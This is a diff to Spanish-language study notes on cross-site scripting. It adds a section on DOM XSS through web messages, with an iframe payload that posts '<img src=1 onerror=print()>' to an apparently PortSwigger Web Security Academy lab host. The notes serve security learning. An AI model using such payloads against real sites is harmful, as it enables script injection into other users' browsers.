@@ -314,7 +314,13 @@ Se inyecta un fragmento para que quede dentro del span pero queremos que cause e
   
 Ya que el la sintaxis de src da error se ejecuta el alert.
   
+# XSS DOM with web Messages
+ 
+ ```
+ <iframe src="https://0a75006d04c0febcc05d5307001c00e0.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
   
+  ```
+ 
   
 ## Referencias
 
